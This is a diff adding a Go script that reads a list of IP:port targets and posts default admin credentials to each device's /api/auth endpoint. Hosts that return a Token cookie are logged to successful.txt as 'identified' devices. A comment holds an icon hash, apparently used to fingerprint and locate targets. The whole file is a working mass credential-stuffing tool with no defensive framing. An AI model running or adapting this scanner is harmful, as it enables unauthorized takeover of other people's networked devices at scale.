@@ -1,0 +1,85 @@
+/*
+
+icon_hash="53996776"
+
+*/
+
+package main
+
+import (
+    "bufio"
+    "bytes"
+    "fmt"
+    "net/http"
+    "os"
+    "strings"
+)
+
+func main() {
+
+    file, err := os.Open("ips.txt")
+    if err != nil {
+        fmt.Println("Error opening ips.txt:", err)
+        return
+    }
+    defer file.Close()
+
+    successfulFile, err := os.Create("successful.txt")
+    if err != nil {
+        fmt.Println("Error creating successful.txt:", err)
+        return
+    }
+    defer successfulFile.Close()
+
+    scanner := bufio.NewScanner(file)
+    for scanner.Scan() {
+        ipPort := scanner.Text()
+
+        url := "http://" + ipPort + "/api/auth"
+        requestBody := []byte(`{"data":{"userid":"admin","password":"YWRtaW4="}}`)
+        contentLength := len(requestBody)
+
+        req, err := http.NewRequest("POST", url, bytes.NewBuffer(requestBody))
+        if err != nil {
+            fmt.Println("Error creating request:", err)
+            continue
+        }
+
+        req.Header.Set("Content-Type", "application/json;charset=UTF-8")
+        req.Header.Set("Accept", "application/json, text/plain, */*")
+        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36")
+        req.Header.Set("Origin", "http://"+ipPort)
+        req.Header.Set("Referer", "http://"+ipPort+"/")
+        req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+        req.Header.Set("Content-Length", fmt.Sprintf("%d", contentLength))
+        req.Close = true
+
+        client := &http.Client{}
+        resp, err := client.Do(req)
+        if err != nil {
+            fmt.Println("Error sending request:", err)
+            continue
+        }
+        defer resp.Body.Close()
+
+        setCookieHeaders, ok := resp.Header["Set-Cookie"]
+        if ok {
+
+            for _, setCookie := range setCookieHeaders {
+                if strings.Contains(setCookie, "Token=") {
+                    tokenValue := strings.Split(setCookie, ";")[0]
+                    fmt.Printf("[coral] identified device %s %s\n", ipPort, tokenValue)
+
+                    successfulFile.WriteString(ipPort + "\n")
+                }
+            }
+        } else {
+            //fmt.Printf("em %s\n", ipPort)
+        }
+    }
+
+    if err := scanner.Err(); err != nil {
+        fmt.Println("Error reading ips.txt:", err)
+    }
+}
